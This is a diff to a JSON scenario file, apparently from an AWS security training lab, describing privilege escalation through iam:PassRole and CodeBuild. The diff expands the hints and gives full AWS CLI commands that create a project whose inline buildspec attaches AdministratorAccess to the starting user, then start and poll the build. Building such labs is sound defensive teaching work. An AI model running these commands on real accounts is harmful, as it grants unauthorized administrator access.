@@ -1,5 +1,5 @@
 {
-  "displayName": "Privilege Escalation via CodeBuild Service Abuse",
+  "displayName": "CodeBuild Project Creation + Build to Admin",
   "name": "codebuild-001-iam-passrole+codebuild-createproject+codebuild-startbuild",
   "description": "Pass a privileged role to CodeBuild and execute buildspec to grant self admin access",
   "costEstimate": "$0/mo",
@@ -31,21 +31,24 @@
     "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/codebuild-001-iam-passrole+codebuild-createproject+codebuild-startbuild"
   },
   "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/codebuild-001-iam-passrole+codebuild-createproject+codebuild-startbuild",
-  "schemaVersion": "3.0.0",
+  "schemaVersion": "4.0.0",
   "permissions": {
     "required": [
       {
         "permission": "codebuild:CreateProject",
+        "principal": "pl-prod-codebuild-001-to-admin-starting-user",
         "resource": "*",
         "description": "create a new CodeBuild project with a privileged service role"
       },
       {
         "permission": "codebuild:StartBuild",
+        "principal": "pl-prod-codebuild-001-to-admin-starting-user",
         "resource": "*",
         "description": "trigger a build that executes the malicious buildspec"
       },
       {
         "permission": "iam:PassRole",
+        "principal": "pl-prod-codebuild-001-to-admin-starting-user",
         "resource": "arn:aws:iam::*:role/pl-prod-codebuild-001-to-admin-target-role",
         "description": "pass the privileged target role to the CodeBuild project"
       }
@@ -53,18 +56,22 @@
     "helpful": [
       {
         "permission": "iam:ListRoles",
+        "principal": "pl-prod-codebuild-001-to-admin-starting-user",
         "purpose": "discover available privileged roles to pass to CodeBuild"
       },
       {
         "permission": "codebuild:ListProjects",
+        "principal": "pl-prod-codebuild-001-to-admin-starting-user",
         "purpose": "list existing CodeBuild projects"
       },
       {
         "permission": "codebuild:BatchGetBuilds",
+        "principal": "pl-prod-codebuild-001-to-admin-starting-user",
         "purpose": "monitor build execution status"
       },
       {
         "permission": "iam:ListUsers",
+        "principal": "pl-prod-codebuild-001-to-admin-starting-user",
         "purpose": "verify admin access after escalation"
       }
     ]
@@ -140,15 +147,17 @@
         "label": "codebuild:CreateProject + iam:PassRole",
         "description": "Create a new CodeBuild project and pass the privileged target role as its service role. This binds the role's permissions to any builds executed within this project.\n",
         "hints": [
-          "You can create AWS CodeBuild projects and pass IAM roles to them.",
-          "Look for privileged roles that trust the CodeBuild service and that you can pass.",
-          "A custom buildspec executed by a privileged service role can modify IAM policies on your behalf.",
+          "Use iam:ListRoles to discover IAM roles in the account \u2014 look for ones whose trust policy allows the CodeBuild service principal to assume them.",
+          "Check which roles your iam:PassRole permission is scoped to \u2014 that tells you exactly which role you can delegate to a CodeBuild project.",
+          "A CodeBuild project's --service-role parameter determines what IAM identity the build runs as. Passing a privileged role here means the buildspec can perform any action that role can.",
+          "The buildspec is just a YAML document with shell commands. Think about what AWS CLI commands the target role can run, and write those commands into the buildspec.",
+          "You do not need an existing source repository \u2014 CodeBuild supports type=NO_SOURCE, so you can supply an inline buildspec directly.",
           "Browse to https://pathfinding.cloud/paths/codebuild-001 for technique details."
         ],
         "commands": [
           {
             "description": "Create CodeBuild project with the privileged service role",
-            "command": "aws codebuild create-project \\\n  --name pl-prod-codebuild-001-privesc-project \\\n  --source type=NO_SOURCE,buildspec=\"version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - aws iam attach-user-policy --user-name pl-prod-codebuild-001-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\" \\\n  --artifacts type=NO_ARTIFACTS \\\n  --environment type=LINUX_CONTAINER,computeType=BUILD_GENERAL1_SMALL,image=aws/codebuild/standard:7.0 \\\n  --service-role arn:aws:iam::{account_id}:role/pl-prod-codebuild-001-to-admin-target-role\n"
+            "command": "aws codebuild create-project \\\n  --name pl-privesc-codebuild-demo \\\n  --source type=NO_SOURCE,buildspec=\"version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - aws iam attach-user-policy --user-name pl-prod-codebuild-001-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\" \\\n  --artifacts type=NO_ARTIFACTS \\\n  --environment type=LINUX_CONTAINER,computeType=BUILD_GENERAL1_SMALL,image=aws/codebuild/standard:7.0 \\\n  --service-role arn:aws:iam::{account_id}:role/pl-prod-codebuild-001-to-admin-target-role\n"
           }
         ]
       },
@@ -158,17 +167,19 @@
         "label": "codebuild:StartBuild \u2192 iam:AttachUserPolicy",
         "description": "Start a build on the project. CodeBuild assumes the target role for the duration of the build. The buildspec executes iam:AttachUserPolicy under the role's permissions, attaching AdministratorAccess to the starting user.\n",
         "hints": [
-          "The build executes with the permissions of the service role assigned to the project.",
-          "You can override the buildspec inline when starting a build."
+          "Trigger the build with codebuild:StartBuild \u2014 capture the build ID from the response so you can track its progress.",
+          "Use codebuild:BatchGetBuilds with the build ID to poll for completion status; the build typically takes 30-60 seconds.",
+          "Once the build status shows SUCCEEDED, wait an additional ~15 seconds for IAM policy propagation before verifying your new permissions.",
+          "Verify the escalation worked by attempting an action your starting user previously could not perform, such as listing IAM users."
         ],
         "commands": [
           {
             "description": "Start the build to execute the privilege escalation",
-            "command": "aws codebuild start-build --project-name pl-prod-codebuild-001-privesc-project"
+            "command": "aws codebuild start-build --project-name pl-privesc-codebuild-demo --output json"
           },
           {
-            "description": "Wait for the build to complete",
-            "command": "aws codebuild batch-get-builds --ids <build-id>"
+            "description": "Poll until the build completes",
+            "command": "aws codebuild batch-get-builds --ids <build-id> --query 'builds[0].buildStatus' --output text"
           },
           {
             "description": "Verify administrator access",
